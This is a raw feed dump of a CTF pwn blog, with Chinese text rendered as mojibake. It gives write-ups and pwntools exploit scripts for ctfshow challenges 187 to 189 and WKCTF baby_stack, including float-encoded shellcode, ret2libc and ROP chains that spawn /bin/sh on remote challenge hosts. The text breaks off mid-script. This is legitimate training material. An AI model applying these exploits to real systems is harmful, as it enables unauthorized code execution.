title="187â€“æµ®ç‚¹æ•°shellcodeç»•è¿‡"></a>187â€“æµ®ç‚¹æ•°shellcodeç»•è¿‡</h1><p>pctf 2016 fixedpoint</p><p><a href="https://www.voidsecurity.in/2016/04/plaid-ctf-2016-fixedpoint.html">https://www.voidsecurity.in/2016/04/plaid-ctf-2016-fixedpoint.html</a></p><p>æºç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">  <span class="type">float</span>* <span class="built_in">array</span> = mmap(<span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="type">float</span>)*<span class="number">8192</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="type">int</span> temp;</span><br><span class="line">  <span class="type">float</span> ftemp;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">8192</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;temp)) <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">array</span>[i] = ((<span class="type">float</span>)temp)/<span class="number">1337.0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;here we go\n&quot;</span>, <span class="number">11</span>);</span><br><span class="line">  (*(<span class="type">void</span>(*)())<span class="built_in">array</span>)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;capstone/capstone.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// gcc -std=c99 -o fixedpoint_disass fixedpoint_disass.c -lcapstone</span></span><br><span class="line"><span class="comment">// usage : ./fixedpoint_disass -100000 100000</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">disass</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num, <span class="type">char</span> *code)</span>  <span class="comment">// ä½¿ç”¨ Capstone åæ±‡ç¼–æ¡†æ¶å°†ä¼ å…¥çš„å­—èŠ‚ç è¿›è¡Œåæ±‡ç¼–ï¼Œå¹¶æ‰“å°åæ±‡ç¼–çš„ç»“æœã€‚</span></span><br><span class="line">&#123;</span><br><span class="line">    csh handle;</span><br><span class="line">    cs_insn *insn;</span><br><span class="line">    <span class="type">size_t</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> inssz = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cs_open(CS_ARCH_X86, CS_MODE_32, &amp;handle) != CS_ERR_OK) <span class="comment">// åˆå§‹åŒ– Capstone å¥æŸ„ï¼ŒæŒ‡å®šæ¶æ„ä¸º CS_ARCH_X86 å’Œæ¨¡å¼ä¸º 32 ä½ (CS_MODE_32)</span></span><br><span class="line">        <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line"></span><br><span class="line">    count = cs_disasm(handle, code, <span class="keyword">sizeof</span>(<span class="type">float</span>), <span class="number">0</span>, <span class="number">0</span>, &amp;insn);  <span class="comment">// å¯¹ä¼ å…¥çš„å­—èŠ‚ç è¿›è¡Œåæ±‡ç¼–</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; count; i++) inssz += insn[i].size;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ£€æŸ¥æ˜¯å¦æ‰€æœ‰å­—èŠ‚éƒ½è¢«åæ±‡ç¼–</span></span><br><span class="line">        <span class="keyword">if</span> (inssz == <span class="keyword">sizeof</span>(<span class="type">float</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; count; i++) </span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d :\t%s\t\t%s\n&quot;</span>, num, insn[i].mnemonic, insn[i].op_str);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        cs_free(insn, count);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cs_close(&amp;handle);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Usage: %s &lt;from&gt; &lt;till&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> from = atoi(argv[<span class="number">1</span>]);  <span class="comment">// èµ·å§‹æ•´æ•°ï¼ˆå¯èƒ½æ˜¯è´Ÿæ•°ï¼‰</span></span><br><span class="line">    <span class="type">int</span> till = atoi(argv[<span class="number">2</span>]);  <span class="comment">// ç»“æŸæ•´æ•°ï¼ˆå¯èƒ½æ˜¯è´Ÿæ•°ï¼‰</span></span><br><span class="line">    <span class="type">char</span> opcode[<span class="number">8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">float</span> bytes;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> num = from; num &lt;= till; num++) &#123;</span><br><span class="line">        bytes = num / <span class="number">1337.0</span>;                       </span><br><span class="line">        <span class="built_in">memcpy</span>(opcode, (<span class="type">char</span> *)&amp;bytes, <span class="keyword">sizeof</span>(<span class="type">float</span>));       <span class="comment">// å°†æµ®ç‚¹æ•°çš„å­—èŠ‚æ‹·è´åˆ°opcodeæ•°ç»„</span></span><br><span class="line">        disass(num, opcode);                                 <span class="comment">// åæ±‡ç¼–</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ‰©å¤§èŒƒå›´æ‰¾åˆ°å¯ç”¨gadgetå³å¯</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202411171637605.png" alt="image-20241117163751508"></p><p>è¿™é‡Œç›´æ¥æŠ„äº†ï¼ˆå·æ‡’zzzï¼‰</p><p>ç”±äºæ²¡å¼€NXï¼Œå¯ä»¥å¾€æ ˆä¸Šå†™shellcodeæ‰§è¡Œï¼Œæ§åˆ¶ä¸€ä¸‹å¯„å­˜å™¨å°±è¡Œäº†</p><p>æ”»å‡»æ€è·¯ï¼šå…ˆæ„é€ ä¸€ä¸ªreadæ¥å¾€æ ˆä¸Šå†™shellcodeï¼Œç„¶åè°ƒæ•´å¯„å­˜å™¨å€¼ï¼Œåˆ©ç”¨call</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tw11ty <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import *</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    <span class="comment"># context.log_level = &#x27;info&#x27;</span></span><br><span class="line">    IPort = <span class="string">&#x27;pwn.challenge.ctf.show 28258&#x27;</span></span><br><span class="line">    pwnfile = <span class="string">&#x27;./187&#x27;</span></span><br><span class="line">    libc_name = <span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span> </span><br><span class="line">    elf  = ELF(pwnfile)</span><br><span class="line">    rop  = ROP(pwnfile)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line"></span><br><span class="line">    io = init(pwnfile, IPort, libc_name)</span><br><span class="line">    <span class="comment"># debug(&#x27;b *0x8048712&#x27;)</span></span><br><span class="line">    sh = asm(shellcraft.i386.linux.sh())</span><br><span class="line">    s(<span class="string">b&quot;-22942\n&quot;</span>) <span class="comment">#mov ecx,eax (array postition)</span></span><br><span class="line">    s(<span class="string">b&quot;-3701\n&quot;</span>)  <span class="comment">#xor eax,eax</span></span><br><span class="line">    s(<span class="string">b&quot;64931\n&quot;</span>)  <span class="comment">#inc eax</span></span><br><span class="line">    s(<span class="string">b&quot;64931\n&quot;</span>)</span><br><span class="line">    s(<span class="string">b&quot;72953\n&quot;</span>)  <span class="comment">#inc eax, pop edx (eax=3, edx=a big number)</span></span><br><span class="line">    s(<span class="string">b&quot;73320\n&quot;</span>)  <span class="comment">#pop ebx until ebx=0</span></span><br><span class="line">    s(<span class="string">b&quot;73320\n&quot;</span>)</span><br><span class="line">    s(<span class="string">b&quot;73320\n&quot;</span>)</span><br><span class="line">    s(<span class="string">b&quot;73320\n&quot;</span>)</span><br><span class="line">    s(<span class="string">b&quot;73320\n&quot;</span>)</span><br><span class="line">    s(<span class="string">b&quot;73320\n&quot;</span>)</span><br><span class="line">    s(<span class="string">b&quot;21526\n&quot;</span>)  <span class="comment">#int 0x80</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># debug(&#x27;b *0x8048712&#x27;)</span></span><br><span class="line">    s(<span class="string">b&quot;0\n&quot;</span>*(<span class="number">8192</span>-<span class="number">12</span>))</span><br><span class="line">    ru(<span class="string">b&#x27;go&#x27;</span>)</span><br><span class="line">    s(<span class="string">b&quot;\x90&quot;</span>*<span class="number">0x100</span>+sh+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># debug()</span></span><br><span class="line">    itr()</span><br></pre></td></tr></table></figure><h1 id="188â€“loginçˆ†ç ´"><a href="#188â€“loginçˆ†ç ´" class="headerlink" title="188â€“loginçˆ†ç ´"></a>188â€“loginçˆ†ç ´</h1><p>çˆ†ç ´å®Œäº†å°±æ˜¯ret2libc</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202411171640179.png" alt="image-20241117164042140"></p><p>çˆ†ç ´è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_hash</span>(<span class="params">target_v3</span>):</span><br><span class="line">    MOD = <span class="number">2018110700000</span></span><br><span class="line">    MULT = <span class="built_in">ord</span>(<span class="string">&#x27;u&#x27;</span>) </span><br><span class="line">    </span><br><span class="line">    charset = string.ascii_letters + string.digits + string.punctuation</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">reverse_step</span>(<span class="params">v3</span>):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> charset:</span><br><span class="line">            char_value = <span class="built_in">ord</span>(char)</span><br><span class="line">            <span class="keyword">if</span> (v3 - char_value) % MULT == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> char</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_string</span>(<span class="params">v3</span>):</span><br><span class="line">        result = []</span><br><span class="line">        <span class="keyword">while</span> v3 &gt; <span class="number">0</span>:</span><br><span class="line">            char = reverse_step(v3)</span><br><span class="line">            <span class="keyword">if</span> char:</span><br><span class="line">                result.append(char)</span><br><span class="line">                v3 = (v3 - <span class="built_in">ord</span>(char))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">reversed</span>(result))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> find_string(target_v3)</span><br><span class="line"></span><br><span class="line">target_v3 = <span class="number">22493966389</span></span><br><span class="line"></span><br><span class="line">possible_str = reverse_hash(target_v3)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Possible string: <span class="subst">&#123;possible_str&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tw11ty <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import *</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    <span class="comment"># context.log_level = &#x27;info&#x27;</span></span><br><span class="line">    IPort = <span class="string">&#x27;pwn.challenge.ctf.show 28182&#x27;</span></span><br><span class="line">    pwnfile = <span class="string">&#x27;./188&#x27;</span></span><br><span class="line">    libc_name = <span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line">    <span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">    elf  = ELF(pwnfile)</span><br><span class="line">    rop  = ROP(pwnfile)</span><br><span class="line">    <span class="comment"># libc = ELF(libc_name)</span></span><br><span class="line"></span><br><span class="line">    io = init(pwnfile, IPort, libc_name)</span><br><span class="line">    </span><br><span class="line">    sla(<span class="string">b&#x27;Please input your name:&#x27;</span>, <span class="string">b&#x27;wyBTs&#x27;</span>)</span><br><span class="line">    prdi = <span class="number">0x0000000000400a93</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x78</span> + p64(<span class="number">0x0000000000400a93</span>) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.sym[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.sym[<span class="string">&#x27;ctfshow&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># debug(&#x27;b *0x004008CC&#x27;)</span></span><br><span class="line">    sla(<span class="string">b&#x27;Please input your code to save\n&#x27;</span>, payload)</span><br><span class="line">    puts_addr = uu64(r64())</span><br><span class="line">    libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line">    libc_base   = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">    system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">    bin_sh      = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x78</span> + p64(<span class="number">0x0000000000400a93</span>) + p64(bin_sh) + p64(<span class="number">0x000000000040028e</span>) + p64(system_addr)</span><br><span class="line">    sla(<span class="string">b&#x27;Please input your code to save\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># debug(&#x27;b *0x04009F5 \n tele 0x0602080&#x27;)</span></span><br><span class="line">    itr()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="189â€“fini-arrayåˆ©ç”¨"><a href="#189â€“fini-arrayåˆ©ç”¨" class="headerlink" title="189â€“fini_arrayåˆ©ç”¨"></a>189â€“fini_arrayåˆ©ç”¨</h1><p>é™æ€ç¼–è¯‘å»äº†ç¬¦å·è¡¨ï¼ˆæ¼ï¼‰</p><p>ç”±_startæ‰¾åˆ°mainï¼Œç¨å¾®ä¿®å¤ä¸€ä¸‹ï¼Œè¿™é‡Œé¢˜ç›®æ¯”è¾ƒç®€å•å°±æ‰‹åŠ¨ä¿®å¤äº†</p><blockquote><p>ç¬¦å·è¡¨ä¿®å¤æ–¹æ³•ï¼š</p><ul><li>åŸºäºç­¾åæ–‡ä»¶çš„ç¬¦å·è¡¨è¿˜åŸ</li><li>FLIRT</li><li>RIZZO</li><li>Lscan</li><li>Syms2ELF</li><li>åŸºäºBinDiffçš„ç¬¦å·è¡¨è¿˜åŸ</li><li>Zynamic Bindiif</li><li>Diaphora</li></ul></blockquote><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202411171656325.png" alt="image-20241117165618261"></p><p>ç»“åˆè°ƒè¯•å‘ç°èƒ½è¿‡å¤Ÿå®ç°ä»»æ„åœ°å€ä¸€æ¬¡å†™</p><p>ä½¿ç”¨fini_arrayæ¥è¿›è¡Œåˆ©ç”¨ã€‚byte_4B9330ä¸º2å­—èŠ‚é•¿åº¦ï¼Œå¾ªç¯256æ¬¡åä¼šä¸Šæº¢</p><p>fini_arrayåˆ©ç”¨ï¼š<a href="https://xz.aliyun.com/t/13402?u_atoken=dc47b54b322e6e7255e59195f9e8f864&u_asig=1a0c399b17318350066338528e004d">fini_arrayåŠ«æŒ - å…ˆçŸ¥ç¤¾åŒº</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;è¿™æ®µæ—¶é—´æ²¡æè¿‡pwnäº†ï¼Œå‘ç°ctfshow wpæ›´æ–°äº†ï¼Œé‚£å°±æ¥å­¦ä¸€ä¸‹å§ğŸ˜‹ï¼ˆç»å¯¹ä¸æ˜¯è¿™ä¸ªåŸå› ğŸ™…ï¼‰&lt;/p&gt;
&lt;h1 id=&quot;181â€“ret2</summary>
      
    
    
    
    <category term="ctfshow" scheme="http://tw11ty.github.io/categories/ctfshow/"/>
    
    
    <category term="ctfshow" scheme="http://tw11ty.github.io/tags/ctfshow/"/>
    
  </entry>
  
  <entry>
    <title>WKCTF-pwn</title>
    <link href="http://tw11ty.github.io/2024/07/15/WKCTF-pwn/"/>
    <id>http://tw11ty.github.io/2024/07/15/WKCTF-pwn/</id>
    <published>2024-07-15T03:33:07.000Z</published>
    <updated>2024-11-16T08:38:47.331Z</updated>
    
    <content type="html"><![CDATA[<h2 id="baby-stack"><a href="#baby-stack" class="headerlink" title="baby_stack"></a>baby_stack</h2><p>waitå‡½æ•°é‡Œé¢æœ‰ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå¤šè¯•å‡ æ¬¡èƒ½è¯•å‡ºæ¥offset&#x3D;20æ—¶æ‹¿åˆ°libc</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151130699.png" alt="image-20240715112838945"></p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151130615.png" alt="image-20240715112847331"></p><p>v2é•¿åº¦ä¸º256å­—èŠ‚ï¼Œæ­¤å‡½æ•°ä¸­çš„a1[256]ä¼šé€ æˆæ ˆä¸Šçš„off by null</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151130539.png" alt="image-20240715112855280"></p><p>å¸ƒç½®çš„payloadï¼Œrbpæ¯æ¬¡ä½å­—èŠ‚ä¸º00</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151130633.png" alt="image-20240715112903110"></p><p>å¯ä»¥ç”¨retå¡«ï¼Œä¸è¿‡expå¤šæ‰“å‡ æ¬¡å‡ºäº†</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151130098.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tw11ty <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import *</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    <span class="comment"># context.log_level = &#x27;info&#x27;</span></span><br><span class="line">    IPort = <span class="string">&#x27;110.40.35.73 33750&#x27;</span></span><br><span class="line">    pwnfile = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc.so.6&#x27;</span> </span><br><span class="line">    <span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">    elf  = ELF(pwnfile)</span><br><span class="line">    rop  = ROP(pwnfile)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line"></span><br><span class="line">    io = init(pwnfile, IPort, libc_name)</span><br><span class="line">    sla(<span class="string">b&#x27;Press enter to continue\n&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Pick a number: &#x27;</span>, <span class="built_in">str</span>(<span class="number">20</span>))</span><br><span class="line">    <span class="comment"># debug()</span></span><br><span class="line">    ru(<span class="string">b&#x27;Your magic number is: &#x27;</span>)</span><br><span class="line">    libc_base = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x401b40</span></span><br><span class="line">    system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    sla(<span class="string">b&#x27;How many bytes do you want to read (max 256)? &#x27;</span>, <span class="built_in">str</span>(<span class="number">256</span>))</span><br><span class="line">    <span class="comment"># sleep(1)</span></span><br><span class="line"></span><br><span class="line">    prdi = <span class="number">0x000000000002164f</span> + libc_base</span><br><span class="line">    ppr  = <span class="number">0x0000000000021b33</span> + libc_base</span><br><span class="line"></span><br><span class="line">    payload = cyclic(<span class="number">152</span>) + p64(prdi) + p64(bin_sh) + p64(ppr) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(system)</span><br><span class="line">    payload = payload.ljust(<span class="number">256</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    <span class="comment"># debug()</span></span><br><span class="line">    s(payload)</span><br><span class="line"></span><br><span class="line">    leak(<span class="string">&quot;libc_base&quot;</span>, libc_base) </span><br><span class="line"></span><br><span class="line">    itr()</span><br></pre></td></tr></table></figure><h2 id="easy-heap"><a href="#easy-heap" class="headerlink" title="easy_heap"></a>easy_heap</h2><p>House of orangeï¼Œä¸è¿‡show()å‡½æ•°åªèƒ½æ‰“å°8å­—èŠ‚æ•°æ®ï¼Œæ„é€ ä¸¤æ¬¡orangeï¼Œå°†ä¸¤å—ç›¸åŒsizeåŒºé—´çš„large chunké“¾åˆ°ä¸€èµ·</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151130370.png" alt="image-20240715112916443"></p><p>ç„¶åç”³è¯·å‡ºå‰ä¸€å—å¤§çš„chunkï¼Œå°±èƒ½å¾—åˆ°æ®‹ç•™çš„heapæŒ‡é’ˆï¼Œç„¶åå°±æ˜¯èƒŒæ¿å­</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151130428.png" alt="image-20240715112927619"></p><p>æœ€åå¸ƒç½®å¥½çš„fake_IO_FILEç»“æ„ä½“</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151137538.png" alt="image-20240715113709496"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 